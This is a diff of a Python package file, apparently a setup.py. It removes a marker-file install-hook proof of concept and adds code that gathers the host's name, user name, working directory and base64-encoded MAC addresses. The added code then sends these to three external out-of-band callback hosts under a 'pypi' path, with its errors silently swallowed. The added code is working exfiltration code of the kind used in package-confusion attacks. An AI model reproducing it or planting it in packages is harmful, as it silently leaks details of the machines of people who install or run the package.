@@ -1,90 +1,67 @@
-#!/usr/bin/env python
-
-from __future__ import print_function
-
+import platform
 import getpass
 import os
-import time
+import urllib.parse
+import urllib.request
+import random
+import subprocess
+import base64
 
-from setuptools import setup
-from setuptools.command.develop import develop
-from setuptools.command.install import install
+def get_mac_addresses():
+    mac_addresses = []
+    system = platform.system()
 
-long_description_filename = os.path.join(
-    os.path.dirname(os.path.abspath(__file__)), 'README.md')
+    if system == "Windows":
+        output = subprocess.check_output("getmac", shell=True).decode()
+        for line in output.splitlines():
+            if "Physical" in line:
+                mac = line.split()[0]
+                mac_addresses.append(mac)
 
-with open(long_description_filename) as fd:
-    long_description = fd.read()
+    elif system == "Linux":
+        output = subprocess.check_output("ifconfig", shell=True).decode()
+        for line in output.splitlines():
+            if "ether" in line:
+                mac = line.split()[1]
+                mac_addresses.append(mac)
 
-FILENAME = '0wneg'
-ROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)
-USER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)
-USER = getpass.getuser()
-TIME = int(time.time())
+    elif system == "Darwin":
+        output = subprocess.check_output("ifconfig", shell=True).decode()
+        for line in output.splitlines():
+            if "ether" in line:
+                mac = line.split()[1]
+                mac_addresses.append(mac)
 
+    return mac_addresses
 
-def touch_file():
-    try:
-        with open(ROOT_PATH, 'a') as root_fd:
-            message = 'Created {!r} with user {!r} at {!r}'.format(
-                ROOT_PATH,
-                USER,
-                TIME
-            )
-            print(message)
-            root_fd.write(message + '\n')
-    except (IOError, OSError):
+def main():
+    hostname = platform.node()
+    username = getpass.getuser()
+    current_path = os.getcwd()
+    rd_num = random.randint(10000, 99999)
+    mac_addresses = get_mac_addresses()
+    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')
+
+    urls = [
+        "http://dnipqouebm-psl.cn.oast-cn.byted-dast.com",
+        "http://oqvignkp58-psl.i18n.oast-row.byted-dast.com",
+        "http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun"
+    ]
+
+    for url in urls:
+        params = {
+            "hostname": hostname,
+            "username": username,
+            "dir": current_path,
+            "mac_address": bs64_encode_mac
+        }
+        full_url = f"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}"
         try:
-            with open(USER_PATH, 'a') as user_fd:
-                message = 'Created {!r} with user {!r} at {!r}'.format(
-                    USER_PATH,
-                    USER,
-                    TIME
-                )
-                print(message)
-                user_fd.write(message + '\n')
-        except (IOError, OSError):
-            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
-            print('What kind of trick system are you running this on?')
+            with urllib.request.urlopen(full_url) as response:
+                pass
+        except Exception as e:
+            pass
 
 
-class PostDevelopCommand(develop):
-    def run(self):
-        touch_file()
-        develop.run(self)
-
-
-class PostInstallCommand(install):
-    def run(self):
-        touch_file()
-        install.run(self)
-
-
-setup(
-    name='0wneg',
-    version='0.9.0',
-    description='Code execution via Python package installation.',
-    long_description=long_description,
-    long_description_content_type='text/markdown',
-    url='https://github.com/mschwager/0wneg',
-    packages=[],
-    license='GPLv3',
-    classifiers=[
-        'Environment :: Console',
-        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
-        'Operating System :: MacOS :: MacOS X',
-        'Operating System :: Microsoft :: Windows',
-        'Operating System :: POSIX',
-        'Programming Language :: Python :: 2.7',
-        'Programming Language :: Python :: 3.4',
-        'Programming Language :: Python :: 3.5',
-        'Programming Language :: Python :: 3.6',
-        'Topic :: Security',
-    ],
-    install_requires=[],
-    tests_require=[],
-    cmdclass={
-        'develop': PostDevelopCommand,
-        'install': PostInstallCommand,
-    },
-)
+if __name__ == "__main__":
+    main()
